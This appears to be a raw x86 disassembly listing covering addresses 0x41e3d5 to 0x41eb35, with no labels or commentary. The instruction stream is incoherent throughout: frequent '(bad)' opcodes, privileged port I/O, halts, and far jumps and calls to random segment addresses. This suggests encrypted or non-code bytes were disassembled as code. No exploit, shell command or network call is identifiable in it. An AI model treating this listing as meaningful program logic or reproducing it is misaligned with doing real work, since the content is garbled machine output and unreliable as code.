  41e3d5:	jecxz  0x41e43e
  41e3d7:	fst    DWORD PTR [eax+0xa]
  41e3da:	and    ebx,esi
  41e3dc:	sub    DWORD PTR [ecx+0x6a],edx
  41e3df:	or     esi,edx
  41e3e1:	mov    edi,0x96144c6
  41e3e6:	mov    bh,0xb3
  41e3e8:	call   0xeb57a21c
  41e3ed:	aad    0x4f
  41e3ef:	add    edi,0xffffffc9
  41e3f2:	mov    ds:0x33f96c9a,al
  41e3f7:	in     al,0x8
  41e3f9:	and    ecx,DWORD PTR [ebx-0x6431a95b]
  41e3ff:	test   al,0x37
  41e401:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e402:	and    ecx,DWORD PTR [eax-0x36]
  41e405:	mov    al,ds:0x8708d7b1
  41e40a:	or     al,BYTE PTR [edi-0x39f7e035]
  41e410:	mov    ah,BYTE PTR [ebx+ebx*4+0x7e]
  41e414:	inc    esp
  41e415:	push   es
  41e416:	add    DWORD PTR [ecx],edi
  41e418:	push   ecx
  41e419:	push   ss
  41e41a:	pop    ss
  41e41b:	xchg   esp,eax
  41e41c:	pusha  
  41e41d:	jo     0x41e3fd
  41e41f:	aam    0x4a
  41e421:	cmc    
  41e422:	add    eax,0x18158c24
  41e427:	xor    al,0x85
  41e429:	push   0xffffffdd
  41e42b:	and    al,0x3e
  41e42d:	outs   dx,BYTE PTR ds:[esi]
  41e42e:	jg     0x41e430
  41e430:	stos   DWORD PTR es:[edi],eax
  41e431:	xchg   ebx,eax
  41e432:	inc    esp
  41e433:	mov    ds:0x68867738,eax
  41e438:	test   BYTE PTR [ebx],ch
  41e43a:	pop    edi
  41e43b:	inc    BYTE PTR [ecx-0x1f5f305f]
  41e441:	nop
  41e442:	lods   eax,DWORD PTR ds:[esi]
  41e443:	and    bh,BYTE PTR [edi+0x71]
  41e446:	lock mov DWORD PTR [ecx-0x774fd10b],ebx
  41e44d:	sbb    esi,DWORD PTR [ecx+0x39113199]
  41e453:	fsubr  st,st(5)
  41e455:	adc    DWORD PTR [esi-0x387a0bbb],ebp
  41e45b:	mov    edi,0x234747a9
  41e460:	hlt    
  41e461:	nop
  41e462:	fwait
  41e463:	iret   
  41e464:	cdq    
  41e465:	ds fwait
  41e467:	push   edx
  41e468:	cmp    ecx,ecx
  41e46a:	cmp    BYTE PTR gs:[ecx+0x6f],0xab
  41e46f:	mov    al,0x9
  41e471:	pop    edx
  41e472:	push   eax
  41e473:	adc    BYTE PTR [ebp-0x67],cl
  41e476:	jmp    0xee11:0x4d593e62
  41e47d:	cmp    ebp,DWORD PTR [esi-0x858077c]
  41e483:	push   ecx
  41e484:	mul    DWORD PTR [eax]
  41e486:	retf   0xac6a
  41e489:	inc    edx
  41e48a:	sbb    ch,cl
  41e48c:	js     0x41e489
  41e48e:	dec    esp
  41e48f:	inc    edi
  41e490:	ret    0xef88
  41e493:	neg    DWORD PTR [edx+ebp*8-0x6a7c845]
  41e49a:	fdiv   st(5),st
  41e49c:	jp     0x41e4ad
  41e49e:	es push ebp
  41e4a0:	inc    ebx
  41e4a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4a2:	dec    esp
  41e4a3:	jbe    0x41e520
  41e4a5:	pop    ecx
  41e4a6:	fild   WORD PTR ds:0x51cb95c5
  41e4ac:	daa    
  41e4ad:	in     eax,dx
  41e4ae:	pop    ebp
  41e4af:	aas    
  41e4b0:	je     0x41e4bb
  41e4b2:	mov    ecx,0x23cca6b3
  41e4b7:	or     ecx,DWORD PTR ds:0x4c3c3ba3
  41e4bd:	aas    
  41e4be:	inc    ebx
  41e4bf:	leave  
  41e4c0:	or     esi,ebx
  41e4c2:	jb     0x41e4ee
  41e4c4:	inc    edi
  41e4c5:	(bad)  
  41e4c6:	std    
  41e4c7:	mov    ds:0xca9b98a6,al
  41e4cc:	rol    ebp,1
  41e4ce:	push   es
  41e4cf:	test   eax,0x8753d9d2
  41e4d4:	das    
  41e4d5:	rcr    BYTE PTR [ebp+0x4fc9d43],0xa
  41e4dc:	fimul  DWORD PTR [ebp-0x62c28646]
  41e4e2:	ret    0x148d
  41e4e5:	push   edx
  41e4e6:	das    
  41e4e7:	arpl   WORD PTR [ebp+0x1c],si
  41e4ea:	xchg   BYTE PTR [esi+0x264ad82f],dl
  41e4f0:	dec    ebp
  41e4f1:	ja     0x41e528
  41e4f3:	(bad)
  41e4f7:	xchg   ebx,eax
  41e4f8:	out    dx,eax
  41e4f9:	and    esp,DWORD PTR [ebx+ebp*2]
  41e4fc:	call   0x56372db1
  41e501:	imul   ebp,DWORD PTR [eax],0x6c731c7e
  41e507:	xor    BYTE PTR [ebx-0x2e],dh
  41e50a:	jne    0x41e4c0
  41e50c:	fiadd  WORD PTR ds:0x437790ae
  41e512:	pop    eax
  41e513:	std    
  41e514:	push   esi
  41e515:	pop    edi
  41e517:	test   DWORD PTR [eax-0x7],eax
  41e51a:	dec    ebx
  41e51b:	cmp    BYTE PTR [ecx],bl
  41e51d:	mov    dh,0xd7
  41e51f:	fs dec eax
  41e521:	dec    edx
  41e522:	xor    BYTE PTR [eax+esi*2+0x1],bl
  41e526:	add    BYTE PTR [esi],ch
  41e528:	inc    edi
  41e529:	or     DWORD PTR [ebx],esp
  41e52b:	rol    BYTE PTR [ebx-0x46],cl
  41e52e:	dec    edi
  41e52f:	sub    edi,edx
  41e531:	loopne 0x41e4f9
  41e533:	or     DWORD PTR [eax],ebp
  41e535:	fwait
  41e536:	retf   
  41e537:	push   edx
  41e538:	int    0xe5
  41e53a:	mov    edx,0xc1212ae6
  41e53f:	jle    0x41e4dd
  41e541:	add    ebx,DWORD PTR [edi-0x22327411]
  41e547:	pop    ss
  41e548:	jg     0x41e4d6
  41e54a:	jae    0x41e53e
  41e54c:	mov    bh,0x81
  41e54e:	nop
  41e54f:	mov    DWORD PTR [ecx],ecx
  41e551:	xchg   esp,eax
  41e552:	(bad)  
  41e553:	xor    eax,0x146d4ca8
  41e558:	push   ss
  41e559:	stc    
  41e55a:	cmp    al,BYTE PTR [esi+esi*4+0x797d3d50]
  41e561:	stos   DWORD PTR es:[edi],eax
  41e562:	clc    
  41e563:	(bad)  
  41e564:	xrelease mov BYTE PTR [edx+edi*1+0x7d],0xb2
  41e56a:	dec    edi
  41e56b:	arpl   sp,si
  41e56d:	xor    esp,DWORD PTR [ebx]
  41e56f:	(bad)  
  41e570:	dec    eax
  41e571:	jno    0x41e53e
  41e573:	fldcw  WORD PTR [ebx+0x77]
  41e576:	outs   dx,DWORD PTR ds:[esi]
  41e577:	test   al,0x83
  41e579:	(bad)  [ebx-0x7a]
  41e57c:	aam    0xba
  41e57e:	or     eax,0x469b44fd
  41e583:	xor    DWORD PTR [edi-0x3c],ebp
  41e586:	lods   eax,DWORD PTR ds:[esi]
  41e587:	jns    0x41e542
  41e589:	adc    DWORD PTR [ebp+eiz*2+0x7e],esp
  41e58d:	push   ss
  41e58e:	add    BYTE PTR [eax],0x3a
  41e591:	jp     0x41e51e
  41e593:	sub    DWORD PTR [ebp-0x6cbc0573],ebx
  41e599:	lock aas 
  41e59b:	test   eax,0x997359fc
  41e5a0:	fidivr DWORD PTR [esi+0x32]
  41e5a3:	or     dh,BYTE PTR [esi-0x29]
  41e5a6:	push   eax
  41e5a7:	out    dx,al
  41e5a8:	in     al,dx
  41e5a9:	pop    edx
  41e5aa:	mov    al,0xde
  41e5ac:	sbb    BYTE PTR [edi+edi*4-0x3778d31c],ah
  41e5b3:	mov    ds:0x56e6f840,eax
  41e5b8:	add    al,0x58
  41e5ba:	cwde   
  41e5bb:	sub    eax,0xea53628b
  41e5c0:	jne    0x41e598
  41e5c2:	pop    ds
  41e5c3:	pushf  
  41e5c4:	sub    cl,dl
  41e5c6:	repnz (bad) 
  41e5c8:	out    dx,al
  41e5c9:	int3   
  41e5ca:	adc    DWORD PTR ds:0xc05a6c3d,ebp
  41e5d0:	clc    
  41e5d1:	sti    
  41e5d2:	data16 ins BYTE PTR es:[edi],dx
  41e5d4:	push   eax
  41e5d5:	pusha  
  41e5d6:	or     ebx,DWORD PTR [ecx+esi*1]
  41e5d9:	mov    eax,ds:0x7ef21bb5
  41e5de:	iret   
  41e5df:	hlt    
  41e5e0:	or     al,0x1b
  41e5e2:	cmp    eax,0x7c6b0890
  41e5e7:	mov    esp,0xf1244167
  41e5ec:	test   DWORD PTR [ecx],esi
  41e5ee:	rcl    BYTE PTR [esi+0x617c966e],cl
  41e5f4:	icebp  
  41e5f5:	dec    edx
  41e5f6:	das    
  41e5f7:	adc    eax,0xb38f35e6
  41e5fc:	scas   eax,DWORD PTR es:[edi]
  41e5fd:	pop    edx
  41e5fe:	ficom  DWORD PTR [ebp+0x30dcd7e1]
  41e604:	pop    ebp
  41e605:	mov    ebp,0xfc236d67
  41e60a:	mov    dl,0xce
  41e60c:	stc    
  41e60d:	cmp    al,BYTE PTR [eax+0xc6a99a8]
  41e613:	stos   BYTE PTR es:[edi],al
  41e614:	mov    edx,gs
  41e616:	outs   dx,BYTE PTR ds:[esi]
  41e617:	push   es
  41e618:	sbb    al,0x9d
  41e61a:	xchg   ebx,eax
  41e61b:	sbb    DWORD PTR [ebp-0x58edb6de],ecx
  41e621:	pop    ebp
  41e622:	inc    edx
  41e623:	mov    ah,0xaa
  41e625:	stos   BYTE PTR es:[edi],al
  41e626:	out    dx,al
  41e627:	imul   esi,DWORD PTR [ebp-0x1e],0xffffffec
  41e62b:	sub    BYTE PTR [edx-0x542370d6],ah
  41e631:	xor    ecx,DWORD PTR [ebp-0x455cfd8f]
  41e637:	xchg   edi,eax
  41e638:	jl     0x41e6ac
  41e63a:	add    DWORD PTR [esi+0x64],ebx
  41e63d:	fbld   TBYTE PTR [eax+0x0]
  41e640:	push   0x55
  41e642:	sub    al,0x47
  41e644:	popf   
  41e645:	xchg   edx,eax
  41e646:	fsubr  QWORD PTR [esi+0x47]
  41e649:	mov    ebp,0xfece0731
  41e64e:	ins    BYTE PTR es:[edi],dx
  41e64f:	arpl   WORD PTR [ecx],si
  41e651:	xchg   ebx,eax
  41e652:	xchg   edx,eax
  41e653:	inc    ebx
  41e654:	jmp    0x41e680
  41e656:	ret    
  41e657:	push   es
  41e658:	outs   dx,DWORD PTR ds:[esi]
  41e659:	clc    
  41e65a:	ds jl  0x41e6d2
  41e65d:	inc    esp
  41e65e:	xchg   esi,eax
  41e65f:	imul   ecx,ecx,0xa0c63780
  41e665:	popa   
  41e666:	push   0xfffffff5
  41e668:	mov    esp,0x4d917978
  41e66d:	clc    
  41e66e:	dec    eax
  41e66f:	or     BYTE PTR ds:0x638cb7fe,bl
  41e675:	push   ecx
  41e676:	sbb    DWORD PTR [edi-0x76a7379a],ecx
  41e67c:	xchg   edx,eax
  41e67d:	xchg   ebp,eax
  41e67e:	repnz aam 0xbd
  41e681:	mov    ch,0xa3
  41e683:	mov    esp,0xa620706d
  41e688:	lds    eax,FWORD PTR [ebx]
  41e68a:	inc    esp
  41e68b:	xor    ebp,DWORD PTR [ebx+0x49c90ef3]
  41e691:	lods   eax,DWORD PTR ds:[esi]
  41e692:	lock jle 0x41e69e
  41e695:	sbb    eax,0xe2396eeb
  41e69a:	loopne 0x41e61e
  41e69c:	dec    BYTE PTR [ecx+0x5b]
  41e69f:	(bad)  
  41e6a0:	push   0x89c5609f
  41e6a5:	adc    eax,DWORD PTR [edi-0x25]
  41e6a8:	(bad)  
  41e6aa:	fmul   QWORD PTR ds:0xdde92704
  41e6b0:	in     al,0xf2
  41e6b2:	mov    al,0xd6
  41e6b4:	mov    dh,0x55
  41e6b6:	stc    
  41e6b7:	add    BYTE PTR [edi+esi*2-0x39],bh
  41e6bb:	(bad)  
  41e6bc:	xchg   esp,eax
  41e6bd:	outs   dx,BYTE PTR ds:[esi]
  41e6be:	jmp    0xc05c198f
  41e6c3:	xor    esi,DWORD PTR [edi+0x71fda326]
  41e6c9:	(bad)  
  41e6ca:	int3   
  41e6cb:	pop    ebx
  41e6cc:	or     eax,ebp
  41e6ce:	call   0xb48e:0x2a26c14c
  41e6d5:	sub    eax,0x20305601
  41e6da:	pop    ebx
  41e6db:	xlat   BYTE PTR ds:[ebx]
  41e6dc:	imul   esp,DWORD PTR [ecx],0x34360c1a
  41e6e2:	or     DWORD PTR [edx+0x2de7eae7],0x4434140b
  41e6ec:	xchg   esp,eax
  41e6ed:	ret    0x21d4
  41e6f0:	mov    dh,0xec
  41e6f2:	xor    cl,BYTE PTR [eax+edi*4-0x36520d83]
  41e6f9:	or     ah,BYTE PTR [edi+0x34fe888]
  41e6ff:	(bad)  
  41e701:	xchg   ebp,eax
  41e702:	jae    0x41e74a
  41e704:	retf   0xe706
  41e707:	imul   esi,DWORD PTR [eax+eax*8+0x35ba16e2],0x46
  41e70f:	jl     0x41e70d
  41e711:	xchg   esp,eax
  41e712:	jge    0x41e6e3
  41e714:	mov    ebx,0xed534113
  41e719:	je     0x41e6bf
  41e71b:	or     BYTE PTR [edi+0x19584c54],dl
  41e721:	cmp    dh,al
  41e723:	outs   dx,BYTE PTR ds:[esi]
  41e724:	stc    
  41e725:	loopne 0x41e714
  41e727:	pop    edx
  41e728:	or     ah,BYTE PTR [ebp+0x47e59066]
  41e72e:	add    edx,DWORD PTR [ebx]
  41e730:	adc    DWORD PTR [esi-0x2009834],edi
  41e736:	hlt    
  41e737:	cs clc 
  41e739:	bound  edi,QWORD PTR [ecx+0x20]
  41e73c:	(bad)  
  41e73d:	arpl   bp,cx
  41e73f:	and    al,0x6a
  41e741:	sub    eax,0x2cdbed39
  41e746:	scas   al,BYTE PTR es:[edi]
  41e747:	or     eax,0xd14834f2
  41e74c:	cmp    ebp,ecx
  41e74e:	jge    0x41e737
  41e750:	mov    DWORD PTR [ecx],ebp
  41e752:	dec    ebx
  41e753:	cmp    dh,BYTE PTR [ebx+0x178060c0]
  41e759:	lods   eax,DWORD PTR ds:[esi]
  41e75a:	push   eax
  41e75b:	mov    dl,0xd8
  41e75d:	int    0x92
  41e75f:	sub    esi,ebx
  41e761:	mov    ds:0x706f4524,eax
  41e766:	xor    BYTE PTR [edi-0x57],0x64
  41e76a:	jbe    0x41e6f3
  41e76c:	xlat   BYTE PTR ds:[ebx]
  41e76d:	sub    eax,0x81d32366
  41e772:	fst    DWORD PTR [ebx]
  41e774:	test   ch,bl
  41e776:	out    dx,eax
  41e777:	ins    BYTE PTR es:[edi],dx
  41e778:	cwde   
  41e779:	sub    DWORD PTR [ecx+0xc871859],ebx
  41e77f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e780:	loop   0x41e742
  41e782:	dec    ecx
  41e783:	sub    eax,0xd8758d34
  41e788:	leave  
  41e789:	(bad)  
  41e78a:	test   edx,0xa802b3e7
  41e790:	popf   
  41e791:	push   cs
  41e792:	mov    al,0xe8
  41e794:	push   eax
  41e795:	push   ecx
  41e796:	jmp    0x86c8:0x49583e0f
  41e79d:	adc    DWORD PTR [eax],edx
  41e79f:	mov    ebx,0x46e81622
  41e7a4:	inc    edx
  41e7a5:	in     eax,0x19
  41e7a7:	jbe    0x41e761
  41e7a9:	int3   
  41e7aa:	ins    BYTE PTR es:[edi],dx
  41e7ab:	cdq    
  41e7ac:	dec    esp
  41e7ad:	adc    ecx,DWORD PTR [edi]
  41e7af:	ror    DWORD PTR [ebx],cl
  41e7b1:	sbb    BYTE PTR ds:0x31be1fc,0x1e
  41e7b8:	jmp    0xbad9:0xab728d09
  41e7bf:	add    DWORD PTR [ebp-0x757bea58],eax
  41e7c5:	stos   DWORD PTR es:[edi],eax
  41e7c6:	int    0x72
  41e7c8:	cmp    eax,DWORD PTR [esi]
  41e7ca:	iret   
  41e7cb:	jbe    0x41e7e2
  41e7cd:	mov    eax,0x466fbd1a
  41e7d2:	xor    eax,0xe9502a62
  41e7d7:	into   
  41e7d8:	pop    ecx
  41e7d9:	xchg   ebp,eax
  41e7da:	mov    dl,0x4
  41e7dc:	sub    al,0xd3
  41e7de:	loope  0x41e819
  41e7e0:	sbb    edx,0xb54b2426
  41e7e6:	rol    DWORD PTR [edi+0x6a],1
  41e7e9:	inc    eax
  41e7ea:	add    dl,ah
  41e7ec:	in     eax,0x90
  41e7ee:	imul   edi,DWORD PTR [eax+0x21525568],0x37
  41e7f5:	jnp    0x41e855
  41e7f7:	popf   
  41e7f8:	jb     0x41e807
  41e7fa:	adc    eax,0x40271743
  41e7ff:	(bad)  
  41e800:	hlt    
  41e801:	outs   dx,BYTE PTR ds:[esi]
  41e802:	push   ecx
  41e803:	cmp    al,0xbd
  41e805:	loope  0x41e7d6
  41e807:	aas    
  41e808:	cmp    BYTE PTR [ebx+0x15],bh
  41e80b:	sbb    eax,0x9f3639d1
  41e810:	retf   
  41e811:	sar    BYTE PTR ds:0xb66087e,1
  41e817:	mov    bl,0xc2
  41e819:	push   0xffffffee
  41e81b:	sbb    esi,edi
  41e81d:	(bad)  
  41e81f:	retf   
  41e820:	add    bl,0xc4
  41e823:	cmp    DWORD PTR ds:0x89f6e980,ebx
  41e829:	daa    
  41e82a:	add    eax,0x11ad6b13
  41e82f:	mov    cs,WORD PTR [edi-0x44]
  41e832:	sar    DWORD PTR [ebp+0x22fa1bb0],0x47
  41e839:	mov    ch,BYTE PTR [esi]
  41e83b:	imul   ebp,DWORD PTR [edx-0x289f7247],0xffffffb9
  41e842:	mov    ds:0x590f72d1,eax
  41e847:	adc    al,0x87
  41e849:	cmp    ch,BYTE PTR [edx*8-0x4260e464]
  41e850:	cmp    ecx,esi
  41e852:	sbb    DWORD PTR [ebp-0x60f7e777],0x2f24b368
  41e85c:	jmp    0xb9eb:0x8dbc49b6
  41e863:	jmp    0x2b01:0x21c32e87
  41e86a:	fsubp  st(3),st
  41e86c:	mov    edi,0x210fa8ba
  41e871:	adc    al,0x1c
  41e873:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e874:	sub    al,0x84
  41e876:	lods   al,BYTE PTR ds:[esi]
  41e877:	push   ebp
  41e878:	xchg   esi,eax
  41e879:	mov    esp,0x5bbab3e7
  41e87e:	js     0x41e8ba
  41e880:	inc    esi
  41e881:	push   eax
  41e882:	xlat   BYTE PTR ds:[ebx]
  41e883:	scas   al,BYTE PTR es:[edi]
  41e884:	sbb    al,0x3
  41e886:	loopne 0x41e84b
  41e888:	repnz cmp eax,0x46ae7bbc
  41e88e:	mov    dh,0xd5
  41e890:	sbb    ah,ah
  41e892:	jns    0x41e8eb
  41e894:	(bad)  [eax+0x3c70910a]
  41e89a:	mov    bl,0x7d
  41e89c:	pop    esi
  41e89d:	fnstcw WORD PTR [edx-0x45]
  41e8a0:	sti    
  41e8a1:	jg     0x41e8ea
  41e8a3:	lea    esi,[edx-0x7557e733]
  41e8a9:	sbb    ebx,esi
  41e8ab:	lods   al,BYTE PTR ds:[esi]
  41e8ac:	js     0x41e844
  41e8ae:	pusha  
  41e8af:	fdivr  DWORD PTR [eax]
  41e8b1:	and    BYTE PTR [edx+0x5b338cd8],0x81
  41e8b8:	cs das 
  41e8ba:	leave  
  41e8bb:	pusha  
  41e8bc:	arpl   WORD PTR [eax-0x25cb4236],dx
  41e8c2:	push   cs
  41e8c3:	sbb    dl,BYTE PTR [esi+0x5ee05225]
  41e8c9:	arpl   WORD PTR [ecx-0x6e5c4748],ax
  41e8cf:	fs gs sahf 
  41e8d2:	imul   edi,DWORD PTR [edi-0x2376646f],0x6c6acf51
  41e8dc:	or     bh,BYTE PTR [ebx-0x3c]
  41e8df:	in     al,dx
  41e8e0:	in     al,dx
  41e8e1:	jnp    0x41e919
  41e8e3:	loop   0x41e95c
  41e8e5:	mov    eax,esi
  41e8e7:	stos   DWORD PTR es:[edi],eax
  41e8e8:	jne    0x41e935
  41e8ea:	imul   ebx,DWORD PTR [esi-0x5c7fb285],0x51d2d270
  41e8f4:	mov    bh,BYTE PTR [ebp-0x63f3c101]
  41e8fa:	xchg   BYTE PTR [ecx-0x18],dh
  41e8fd:	pop    es
  41e8fe:	mov    cl,0x4d
  41e900:	mov    al,0xcd
  41e902:	fs in  eax,dx
  41e904:	popf   
  41e905:	cwde   
  41e906:	adc    edi,DWORD PTR [ebx-0x4e3da595]
  41e90c:	(bad)  
  41e90d:	jmp    0xa590f873
  41e912:	and    eax,0xaf5e6491
  41e917:	ja     0x41e98d
  41e919:	push   0xfffffff1
  41e91b:	push   ds
  41e91c:	lods   eax,DWORD PTR cs:[esi]
  41e91e:	les    edi,FWORD PTR [ecx-0x1a]
  41e921:	dec    edx
  41e922:	xchg   ecx,eax
  41e923:	push   es
  41e924:	(bad)  
  41e925:	loopne 0x41e945
  41e927:	lods   al,BYTE PTR ds:[esi]
  41e928:	fild   QWORD PTR [edx+0x72]
  41e92b:	nop
  41e92c:	ins    WORD PTR es:[edi],dx
  41e92e:	loopne 0x41e9a6
  41e930:	mov    ah,cl
  41e932:	jo     0x41e96b
  41e934:	leave  
  41e935:	inc    edi
  41e936:	das    
  41e937:	and    DWORD PTR [esi],0xbf9a6b49
  41e93d:	mov    edi,0x466f2c23
  41e942:	popf   
  41e943:	dec    esp
  41e944:	jmp    0x414d:0xd1f4f247
  41e94b:	push   eax
  41e94c:	adc    DWORD PTR [edx-0x32],0x1f
  41e950:	cmp    DWORD PTR [ebp-0x55c6e5fc],esp
  41e956:	and    BYTE PTR [ebx+eiz*2-0x2a3e7dce],0xb6
  41e95e:	(bad)  
  41e95f:	lahf   
  41e960:	sti    
  41e961:	mov    ds:0xe1b72e30,al
  41e966:	sub    edi,esi
  41e968:	pop    ebp
  41e969:	out    dx,al
  41e96a:	pop    eax
  41e96b:	iret   
  41e96c:	retf   0xbe8a
  41e96f:	test   eax,0x22528657
  41e974:	arpl   WORD PTR [edx],bx
  41e976:	test   al,0xd6
  41e978:	xlat   BYTE PTR ds:[ebx]
  41e979:	les    ecx,FWORD PTR [edi-0xd]
  41e97c:	aaa    
  41e97d:	les    ebp,FWORD PTR [edi-0x69]
  41e980:	mov    bh,ah
  41e982:	ror    BYTE PTR [esi+0x19],1
  41e985:	jle    0x41e9bd
  41e987:	fmul   QWORD PTR [ebp-0x2db362ed]
  41e98d:	into   
  41e98e:	js     0x41e997
  41e990:	cli    
  41e991:	sub    al,0x5c
  41e993:	mov    bl,0x70
  41e995:	test   eax,0x7bb05e4a
  41e99a:	and    ebx,ebp
  41e99c:	icebp  
  41e99d:	in     eax,0xa0
  41e99f:	mov    dl,0xe2
  41e9a1:	xchg   edx,eax
  41e9a2:	div    BYTE PTR [ebx-0x40]
  41e9a5:	xchg   ebp,eax
  41e9a6:	ja     0x41ea08
  41e9a8:	pop    ds
  41e9a9:	xchg   ebx,eax
  41e9aa:	aam    0xde
  41e9ac:	inc    ebp
  41e9ad:	push   es
  41e9ae:	ror    BYTE PTR [ecx],cl
  41e9b0:	jns    0x41e9b0
  41e9b2:	fistp  DWORD PTR [esi+0x212f3c66]
  41e9b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9b9:	adc    al,0x57
  41e9bb:	xor    ebp,ebp
  41e9bd:	and    bh,ch
  41e9bf:	xchg   esp,eax
  41e9c0:	sub    BYTE PTR [ecx],ch
  41e9c2:	adc    al,0x9f
  41e9c4:	jl     0x41e9e7
  41e9c6:	(bad)  
  41e9c7:	dec    ebx
  41e9c8:	jecxz  0x41e9b5
  41e9ca:	dec    esi
  41e9cb:	popf   
  41e9cc:	shr    DWORD PTR ds:0x3f8a7fa,0x40
  41e9d3:	adc    eax,0x29d38d2b
  41e9d8:	pusha  
  41e9d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9da:	mov    ebx,0x3c58b657
  41e9df:	scas   al,BYTE PTR es:[edi]
  41e9e0:	aas    
  41e9e1:	add    edi,DWORD PTR [eax]
  41e9e3:	in     al,dx
  41e9e4:	pop    es
  41e9e5:	fsubr  QWORD PTR [eax+0x52b76866]
  41e9eb:	out    dx,eax
  41e9ec:	inc    ebp
  41e9ed:	fwait
  41e9ee:	pusha  
  41e9ef:	sub    al,0xc8
  41e9f1:	mov    ch,0xd6
  41e9f3:	jp     0x41e9c2
  41e9f5:	nop
  41e9f6:	jg     0x41e983
  41e9f8:	pop    ds
  41e9f9:	xchg   ebp,eax
  41e9fa:	test   BYTE PTR [ecx-0x9],0xb8
  41e9fe:	jg     0x41ea34
  41ea00:	mov    ebp,fs
  41ea02:	push   ecx
  41ea03:	jle    0x41e992
  41ea05:	xor    esp,DWORD PTR [ecx+eax*8-0x74f96e6d]
  41ea0c:	pop    ecx
  41ea0d:	dec    esi
  41ea0e:	xchg   ebx,eax
  41ea0f:	dec    esp
  41ea10:	lock add al,0xc4
  41ea13:	test   BYTE PTR [ebp-0x4976a3dd],dh
  41ea19:	mov    ch,0xcd
  41ea1b:	ret    0xad7c
  41ea1e:	in     al,0x14
  41ea20:	pop    ss
  41ea21:	in     al,dx
  41ea22:	dec    esi
  41ea23:	lods   eax,DWORD PTR ds:[esi]
  41ea24:	es inc ebx
  41ea26:	adc    esi,DWORD PTR [eax]
  41ea28:	fxch   st(7)
  41ea2a:	daa    
  41ea2b:	fistp  DWORD PTR [edi-0x759a7773]
  41ea31:	inc    edi
  41ea32:	fimul  DWORD PTR [ecx]
  41ea34:	push   esi
  41ea35:	pop    esp
  41ea36:	jge    0x41ea57
  41ea38:	xor    ecx,DWORD PTR [esi]
  41ea3a:	repnz mov bl,0xab
  41ea3d:	fdivr  st,st(7)
  41ea3f:	enter  0x8ffb,0x94
  41ea43:	call   0xec1e:0xc86d8b27
  41ea4a:	mov    dl,0x56
  41ea4c:	and    eax,0xad2756f7
  41ea51:	push   ecx
  41ea52:	(bad)  
  41ea54:	int    0x9c
  41ea56:	xor    DWORD PTR [ecx+0x4a],ebp
  41ea59:	xchg   edi,eax
  41ea5a:	sar    esi,cl
  41ea5c:	(bad)  
  41ea5d:	mov    dh,0x3c
  41ea5f:	retf   
  41ea60:	inc    ecx
  41ea61:	xchg   edi,eax
  41ea62:	inc    esp
  41ea63:	push   ebx
  41ea64:	and    bl,cl
  41ea66:	jecxz  0x41ea29
  41ea68:	stos   DWORD PTR es:[edi],eax
  41ea69:	rcr    ah,0x3e
  41ea6c:	adc    BYTE PTR [edx+0x15f2666f],bh
  41ea72:	push   ebx
  41ea73:	push   esp
  41ea74:	push   edx
  41ea75:	js     0x41e9fa
  41ea77:	xchg   ecx,eax
  41ea78:	(bad)  
  41ea79:	jno    0x41ea43
  41ea7b:	int    0x19
  41ea7d:	mov    ebx,0xd2d13cb
  41ea82:	push   eax
  41ea83:	mov    esi,DWORD PTR [eax]
  41ea85:	dec    esi
  41ea86:	pushf  
  41ea87:	(bad)  
  41ea88:	in     al,0x4b
  41ea8a:	mov    ebp,0xa8f7a3ba
  41ea8f:	pop    es
  41ea90:	out    dx,eax
  41ea91:	pop    ecx
  41ea92:	jb     0x41ea9e
  41ea94:	mov    eax,0xe09b2480
  41ea99:	or     BYTE PTR [eax],bl
  41ea9b:	dec    esi
  41ea9c:	cmp    edx,ecx
  41ea9e:	xchg   esi,eax
  41ea9f:	xchg   edi,eax
  41eaa0:	arpl   WORD PTR [edi+0x26bcb65],ax
  41eaa6:	cmp    al,0xe7
  41eaa8:	fild   DWORD PTR [ebp+0xc]
  41eaab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eaac:	and    ebx,ebp
  41eaae:	mov    dh,0x3c
  41eab0:	jle    0x41eb2c
  41eab2:	das    
  41eab3:	inc    eax
  41eab4:	(bad)  
  41eab5:	jmp    0x41eada
  41eab7:	repnz (bad) 
  41eab9:	mov    edi,0x58f377fc
  41eabe:	bound  ebx,QWORD PTR [eax-0xa]
  41eac1:	sbb    ax,WORD PTR [edx+ebx*8]
  41eac5:	into   
  41eac6:	adc    esp,esi
  41eac8:	xchg   DWORD PTR [edx],edi
  41eaca:	fld    QWORD PTR [esi]
  41eacc:	in     eax,dx
  41eacd:	xlat   BYTE PTR ds:[ebx]
  41eace:	popf   
  41eacf:	xor    al,0x97
  41ead1:	shr    DWORD PTR [eax],1
  41ead3:	xchg   DWORD PTR [ebx+0x70f7536a],esp
  41ead9:	inc    eax
  41eada:	iret   
  41eadb:	xchg   edi,eax
  41eadc:	je     0x41eabe
  41eade:	scas   eax,DWORD PTR es:[edi]
  41eadf:	(bad)
  41eae3:	lds    ecx,FWORD PTR [ebx]
  41eae5:	cmp    BYTE PTR [ebp-0x382ba380],bh
  41eaeb:	cmp    ecx,eax
  41eaed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eaee:	(bad)  
  41eaef:	cdq    
  41eaf0:	lock jle 0x41ea76
  41eaf3:	cdq    
  41eaf4:	jmp    0x41eb4a
  41eaf6:	or     eax,0x3dcc5c24
  41eafb:	xor    al,0x45
  41eafd:	(bad)  
  41eaff:	sub    BYTE PTR [edx+0x49],cl
  41eb02:	pop    edi
  41eb03:	mov    cl,0x2
  41eb05:	lock fcom DWORD PTR [esi+eax*2+0x68e192a9]
  41eb0d:	push   ecx
  41eb0e:	dec    ecx
  41eb0f:	(bad)
  41eb14:	push   ss
  41eb15:	mov    edx,0x18817aef
  41eb1a:	stos   DWORD PTR es:[edi],eax
  41eb1b:	inc    ebp
  41eb1c:	push   ebx
  41eb1d:	shr    BYTE PTR ds:[ecx-0x78],cl
  41eb21:	shr    DWORD PTR [edi-0x64],cl
  41eb24:	outs   dx,BYTE PTR ds:[si]
  41eb26:	scas   eax,DWORD PTR es:[edi]
  41eb27:	in     eax,0xa
  41eb29:	jns    0x41eb96
  41eb2b:	cdq    
  41eb2c:	sbb    al,0xfa
  41eb2e:	xor    DWORD PTR [eax-0x77f4ffe1],0xffffffd4
  41eb35:	ds ret 0xd84
